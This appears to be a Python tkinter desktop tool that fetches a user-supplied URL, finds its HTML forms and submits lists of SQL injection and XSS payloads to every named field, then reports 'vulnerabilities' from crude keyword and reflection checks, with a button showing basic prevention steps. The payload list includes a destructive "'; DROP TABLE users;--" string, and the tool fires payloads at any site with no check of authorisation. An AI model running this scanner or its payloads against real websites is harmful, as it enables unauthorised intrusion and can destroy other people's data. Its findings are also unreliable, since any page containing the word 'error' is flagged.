

import tkinter as tk
from tkinter import scrolledtext, messagebox
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import threading

# Define SQL injection payloads
sql_payloads = [
    ("' OR '1'='1", "Simple SQL injection payload"),
    ("' OR 1=1--", "SQL injection with comment"),
    ("' OR 'x'='x", "SQL injection with always true condition"),
    ("'; DROP TABLE users;--", "SQL injection with additional command"),
    ("' AND '1'='1", "Simple SQL injection payload"),
    ("' AND 1=1--", "SQL injection with comment"),
    ("' AND 'x'='x", "SQL injection with always true condition"),
]

# Define XSS payloads
xss_payloads = [
    ('<script>alert("XSS");</script>', "Basic XSS payload"),
    ('<img src="x" onerror="alert(\'XSS\')" />', "XSS payload in image tag"),
    ('<svg/onload=alert(document.domain)>', "XSS payload in SVG tag"),
    ('<iframe src="javascript:alert(\'XSS\')">', "XSS payload in iframe"),
    ('<a href="javascript:alert(\'XSS\')">XSS</a>', "XSS payload in anchor tag"),
]

def scan_for_sql_vulnerabilities():
    threading.Thread(target=perform_sql_scan).start()

def perform_sql_scan():
    url = url_entry.get()
    clear_results()

    if not url:
        messagebox.showerror("Error", "Please enter a valid URL.")
        return

    try:
        response = requests.get(url)
        response.raise_for_status()
    except requests.RequestException as e:
        messagebox.showerror("Error", f"Failed to fetch URL: {e}")
        return

    soup = BeautifulSoup(response.text, 'html.parser')
    forms = soup.find_all('form')

    if not forms:
        update_result_text("No forms found on the webpage.\n", "info")
        return

    update_result_text("Detected {} form(s) on the webpage.\n\n".format(len(forms)), "info")
    threads = []

    for form_index, form in enumerate(forms, start=1):
        action = form.get('action')
        method = form.get('method', 'get').lower()
        inputs = form.find_all(['input', 'textarea', 'select'])

        if action:
            for input_field in inputs:
                input_name = input_field.get('name')
                if not input_name:
                    continue

                for payload, description in sql_payloads:
                    thread = threading.Thread(target=test_sql_injection, args=(url, action, method, input_name, payload, description, form_index))
                    thread.start()
                    threads.append(thread)

    for thread in threads:
        thread.join()

def test_sql_injection(url, action, method, input_name, payload, description, form_index):
    data = {input_name: payload}
    if 'password' in input_name.lower():
        data['password'] = payload

    action_url = urljoin(url, action)

    try:
        if method == 'post':
            response = requests.post(action_url, data=data)
        else:
            response = requests.get(action_url, params=data)
    except requests.RequestException as e:
        update_result_text(f"Failed to send {method.upper()} request: {e}\n", "error")
        return

    if response.status_code == 200:
        if any(keyword in response.text.lower() for keyword in ['error', 'exception', 'warning']):
            update_result_text(f"VULNERABILITY FOUND!\nForm {form_index} - Field '{input_name}' with payload: {description}\n", "vulnerable")
        else:
            update_result_text(f"Form {form_index} - Field '{input_name}' - No vulnerabilities found.\n", "safe")

def scan_for_xss_vulnerabilities():
    threading.Thread(target=perform_xss_scan).start()

def perform_xss_scan():
    url = url_entry.get()
    clear_results()

    if not url:
        messagebox.showerror("Error", "Please enter a valid URL.")
        return

    try:
        response = requests.get(url)
        response.raise_for_status()
    except requests.RequestException as e:
        messagebox.showerror("Error", f"Failed to fetch URL: {e}")
        return

    soup = BeautifulSoup(response.text, 'html.parser')
    forms = soup.find_all('form')

    if not forms:
        update_result_text("No forms found on the webpage.\n", "info")
        return

    update_result_text("Detected {} form(s) on the webpage.\n\n".format(len(forms)), "info")
    threads = []

    for form_index, form in enumerate(forms, start=1):
        action = form.get('action')
        method = form.get('method', 'get').lower()
        inputs = form.find_all(['input', 'textarea', 'select'])

        if action:
            for input_field in inputs:
                input_name = input_field.get('name')
                if not input_name:
                    continue

                for payload, description in xss_payloads:
                    thread = threading.Thread(target=test_xss_injection, args=(url, action, method, input_name, payload, description, form_index))
                    thread.start()
                    threads.append(thread)

    for thread in threads:
        thread.join()

def test_xss_injection(url, action, method, input_name, payload, description, form_index):
    data = {input_name: payload}
    action_url = urljoin(url, action)

    try:
        if method == 'post':
            response = requests.post(action_url, data=data)
        else:
            response = requests.get(action_url, params=data)
    except requests.RequestException as e:
        update_result_text(f"Failed to send {method.upper()} request: {e}\n", "error")
        return

    if response.status_code == 200 and payload in response.text:
        update_result_text(f"VULNERABILITY FOUND!\nForm {form_index} - Field '{input_name}' is vulnerable to XSS with payload: {description}\n", "vulnerable")
    else:
        update_result_text(f"Form {form_index} - Field '{input_name}' - No vulnerabilities found.\n", "safe")

def update_result_text(text, tag):
    result_text.insert(tk.END, text + '\n')
    result_text.tag_add(tag, "end-2l", "end-1l")
    result_text.see(tk.END)


def show_prevention_steps():
    # Clear previous prevention steps
    result_text.delete('1.0', tk.END)

    # Display prevention steps for SQL injection
    result_text.insert(tk.END, "Prevention steps for SQL injection:\n")
    result_text.insert(tk.END, "- Use parameterized queries or prepared statements.\n")
    result_text.insert(tk.END, "- Perform input validation and sanitize user inputs.\n")
    result_text.insert(tk.END, "- Avoid dynamic SQL queries where possible.\n\n")

    # Display prevention steps for XSS
    result_text.insert(tk.END, "Prevention steps for XSS:\n")
    result_text.insert(tk.END, "- Encode user inputs to prevent script injection.\n")
    result_text.insert(tk.END, "- Implement Content Security Policy (CSP).\n")
    result_text.insert(tk.END, "- Validate and sanitize user inputs to remove harmful content.\n\n")


def clear_results():
    result_text.delete('1.0', tk.END)

# Create and configure the main application window
root = tk.Tk()
root.title("SQL Injection Scanner")

window_width = 800
window_height = 600
screen_width = root.winfo_screenwidth()
screen_height = root.winfo_screenheight()

# Calculate window position
x_coordinate = (screen_width / 2) - (window_width / 2)
y_coordinate = (screen_height / 2) - (window_height / 2)

# Set window geometry
root.geometry("%dx%d+%d+%d" % (window_width, window_height, x_coordinate, y_coordinate))

# Set window background color
root.configure(bg="#333333")

# Create title label
title_label = tk.Label(root, text="SQL Injection Scanner", bg="#333333", fg="white", font=("Arial", 24, "bold"))
title_label.pack(pady=(20, 10))

# Create URL entry and label
url_label = tk.Label(root, text="Enter URL:", bg="#333333", fg="white", font=("Arial", 14))
url_label.pack()

url_entry = tk.Entry(root, width=50, font=("Arial", 12))
url_entry.pack(pady=5)

# Create Scan button for SQL injection
scan_button = tk.Button(root, text="Scan for SQL Injection", command=scan_for_sql_vulnerabilities, bg="#007bff", fg="white", font=("Arial", 12), relief=tk.FLAT)
scan_button.pack(pady=5)

# Create Scan button for XSS
xss_scan_button = tk.Button(root, text="Scan for XSS", command=scan_for_xss_vulnerabilities, bg="#28a745", fg="white", font=("Arial", 12), relief=tk.FLAT)
xss_scan_button.pack(pady=5)

# Create text widget to display scan results
result_text = scrolledtext.ScrolledText(root, width=70, height=20, font=("Arial", 12), bg="#f2f2f2")
result_text.pack(pady=20, padx=10, fill="both", expand=True)


# Create Prevention button
prevention_button = tk.Button(root, text="Show Prevention Steps", command=show_prevention_steps, bg="#ffc107", fg="black", font=("Arial", 12), relief=tk.FLAT)
prevention_button.pack(pady=5)


# Create Clear Results button
clear_button = tk.Button(root, text="Clear Results", command=clear_results, bg="#dc3545", fg="white", font=("Arial", 12), relief=tk.FLAT)
clear_button.pack(pady=5)

# Run the application
root.mainloop()

